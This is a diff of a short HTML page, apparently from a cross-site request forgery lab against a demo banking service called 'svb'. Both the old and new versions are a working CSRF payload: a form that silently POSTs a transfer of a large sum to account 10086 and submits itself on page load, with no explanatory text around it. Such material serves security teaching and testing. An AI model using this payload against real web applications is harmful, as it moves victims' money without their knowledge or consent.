@@ -1,12 +1,11 @@
 <html>
-
-    <form id="form" method="POST" action="http://svb:5003/transfer/1">
-
-    <input class="input is-large" type="text" name="account" placeholder="To account number" value="10086" />
-    <input class="input is-large" type="text" name="amount" placeholder="Amount" value="200000000001" />
-
+  <head>
+    <title>Fake Form</title>
+  </head>
+  <body onload="document.bank_form.submit()">
+   <form action="http://svb:5003/transfer/1" method="POST" name="bank_form" >
+      <input type="text" name="amount" value="2000000001">   
+      <input type="text" name="account" value="10086">
     </form>
-
-    <script>document.getElementById("form").submit();</script>
-
+  </body>
 </html>
